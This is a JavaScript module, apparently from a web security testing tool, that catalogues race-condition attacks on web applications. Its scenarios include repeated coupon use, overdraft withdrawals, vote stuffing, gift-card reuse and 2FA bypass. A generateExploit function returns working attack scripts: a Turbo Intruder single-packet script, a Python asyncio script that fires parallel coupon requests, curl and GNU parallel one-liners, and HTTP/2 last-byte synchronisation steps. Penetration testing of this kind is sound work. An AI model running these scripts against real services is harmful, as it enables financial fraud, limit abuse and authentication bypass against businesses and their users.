// Race Condition Vulnerability Payloads
// Comprehensive payload database for race condition security testing

const RaceConditionPayloads = {
    // Limit overrun attacks
    limitOverrun: [
        {
            type: 'coupon',
            description: 'Apply discount code multiple times',
            endpoint: '/apply-coupon',
            method: 'POST',
            parallel: 20
        },
        {
            type: 'balance',
            description: 'Withdraw more than account balance',
            endpoint: '/withdraw',
            method: 'POST',
            parallel: 10
        },
        {
            type: 'vote',
            description: 'Vote multiple times bypassing limit',
            endpoint: '/vote',
            method: 'POST',
            parallel: 50
        },
        {
            type: 'redeem',
            description: 'Redeem gift card multiple times',
            endpoint: '/redeem',
            method: 'POST',
            parallel: 20
        }
    ],

    // Time-of-check to time-of-use (TOCTOU)
    toctou: [
        {
            type: 'file_upload',
            description: 'Upload then access before validation',
            steps: ['POST /upload', 'GET /files/{id}']
        },
        {
            type: 'password_reset',
            description: 'Use token while being invalidated',
            steps: ['POST /reset', 'POST /reset same token']
        },
        {
            type: 'privilege_check',
            description: 'Act during privilege verification',
            steps: ['Check permission', 'Perform action before check completes']
        }
    ],

    // Single-packet attack (HTTP/2)
    singlePacket: [
        {
            technique: 'last-byte-sync',
            description: 'Send all requests with last byte held back, then release simultaneously',
            parallel: 20
        },
        {
            technique: 'http2-multiplexing',
            description: 'Use HTTP/2 to send multiple requests in single TCP packet',
            parallel: 30
        }
    ],

    // Multi-endpoint race conditions
    multiEndpoint: [
        {
            name: 'Email change race',
            description: 'Change email while verification email is being sent',
            endpoints: ['/change-email', '/verify-email']
        },
        {
            name: '2FA bypass',
            description: 'Login while 2FA is being verified',
            endpoints: ['/login', '/verify-2fa']
        },
        {
            name: 'Session race',
            description: 'Access protected resource while session is being invalidated',
            endpoints: ['/logout', '/protected']
        }
    ],

    // Partial construction attacks
    partialConstruction: [
        {
            type: 'user_creation',
            description: 'Access user during creation before all fields are set',
            vulnerable_window: 'Between INSERT and UPDATE'
        },
        {
            type: 'order_processing',
            description: 'Modify order during payment processing',
            vulnerable_window: 'Between order creation and payment confirmation'
        }
    ],

    // Common race condition patterns
    patterns: [
        'check-then-act',
        'read-modify-write',
        'lazy-initialization',
        'double-checked-locking'
    ],

    // Test configurations
    testConfigs: {
        parallelRequests: [5, 10, 20, 50, 100],
        delayMs: [0, 10, 50, 100],
        retryCount: 3
    }
};

// Test types
const RaceConditionTests = {
    limitOverrun: {
        name: 'Limit Overrun',
        description: 'Exceed limits by racing requests',
        severity: 'HIGH'
    },
    toctou: {
        name: 'TOCTOU',
        description: 'Time-of-check to time-of-use',
        severity: 'HIGH'
    },
    singlePacket: {
        name: 'Single-Packet Attack',
        description: 'HTTP/2 multiplexed race',
        severity: 'CRITICAL'
    },
    multiEndpoint: {
        name: 'Multi-Endpoint Race',
        description: 'Race between different endpoints',
        severity: 'HIGH'
    },
    partialConstruction: {
        name: 'Partial Construction',
        description: 'Access during object construction',
        severity: 'MEDIUM'
    }
};

// Helper functions
function getLimitOverrunPayloads() {
    return RaceConditionPayloads.limitOverrun;
}

function getTOCTOUPayloads() {
    return RaceConditionPayloads.toctou;
}

function getSinglePacketPayloads() {
    return RaceConditionPayloads.singlePacket;
}

function getMultiEndpointPayloads() {
    return RaceConditionPayloads.multiEndpoint;
}

function getPayloadCount() {
    return RaceConditionPayloads.limitOverrun.length +
        RaceConditionPayloads.toctou.length +
        RaceConditionPayloads.singlePacket.length +
        RaceConditionPayloads.multiEndpoint.length +
        RaceConditionPayloads.partialConstruction.length;
}

function generateExploit(type) {
    switch (type) {
        case 'turbo':
            return `# Turbo Intruder Script (BApp Store)
# Single-packet attack for race conditions

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    
    # Build request with %s placeholder
    request = '''POST /apply-coupon HTTP/2
Host: TARGET
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

coupon=DISCOUNT20'''

    # Queue 20 requests
    for i in range(20):
        engine.queue(request, gate='race1')
    
    # Release all at once (single-packet attack)
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)`;

        case 'python':
            return `# Python Race Condition Exploit
import asyncio
import aiohttp

async def send_request(session, url, data):
    async with session.post(url, data=data) as response:
        return await response.text()

async def race_attack(url, data, count=20):
    async with aiohttp.ClientSession() as session:
        # Create all requests
        tasks = [send_request(session, url, data) for _ in range(count)]
        
        # Send all simultaneously
        results = await asyncio.gather(*tasks)
        return results

# Usage
url = "https://target.com/apply-coupon"
data = {"coupon": "DISCOUNT20"}
results = asyncio.run(race_attack(url, data, 20))

# Check for successful exploits
for i, result in enumerate(results):
    if "Success" in result:
        print(f"Request {i}: Coupon applied!")`;

        case 'curl':
            return `# Curl-based Race Condition Attack
# Using GNU Parallel for concurrent requests

# Create request file
cat > request.txt << 'EOF'
POST /apply-coupon HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

coupon=DISCOUNT20
EOF

# Send 20 parallel requests
seq 1 20 | parallel -j20 "curl -s -X POST \\
  'https://target.com/apply-coupon' \\
  -H 'Cookie: session=YOUR_SESSION' \\
  -d 'coupon=DISCOUNT20'"

# Using curl with --parallel (curl 7.66+)
curl --parallel --parallel-immediate --parallel-max 20 \\
  -X POST 'https://target.com/apply-coupon' \\
  -d 'coupon=DISCOUNT20' \\
  'https://target.com/apply-coupon' \\
  'https://target.com/apply-coupon' # repeat 20 times`;

        case 'http2':
            return `# HTTP/2 Single-Packet Attack

# The key is to send multiple requests in ONE TCP packet
# This eliminates network jitter entirely

# Using Turbo Intruder with Engine.BURP2:
engine = RequestEngine(
    endpoint=target.endpoint,
    concurrentConnections=1,  # Important: single connection
    engine=Engine.BURP2       # Uses HTTP/2
)

# All requests share same connection, sent as single packet
for i in range(20):
    engine.queue(request, gate='race1')

# Gate ensures all requests are buffered before sending
engine.openGate('race1')

# Alternative: "Last-byte synchronization"
# 1. Send all requests except last byte
# 2. Wait for all to be buffered
# 3. Send all last bytes simultaneously`;

        default:
            return '';
    }
}

// Generate timing diagram
function generateTimingDiagram() {
    return `
Timeline of Race Condition:
===========================

Normal Flow:
[Check Balance] -----> [Deduct Amount] -----> [Complete]
     |                      |                     |
     t=0                   t=1                   t=2

Race Condition:
Request 1: [Check Balance=$100] -----> [Deduct $100] 
Request 2:     [Check Balance=$100] -----> [Deduct $100]
                    |
            Both see $100 available!
            Result: -$100 balance (overdraft)
`;
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        RaceConditionPayloads,
        RaceConditionTests,
        getLimitOverrunPayloads,
        getTOCTOUPayloads,
        getSinglePacketPayloads,
        getMultiEndpointPayloads,
        getPayloadCount,
        generateExploit,
        generateTimingDiagram
    };
}
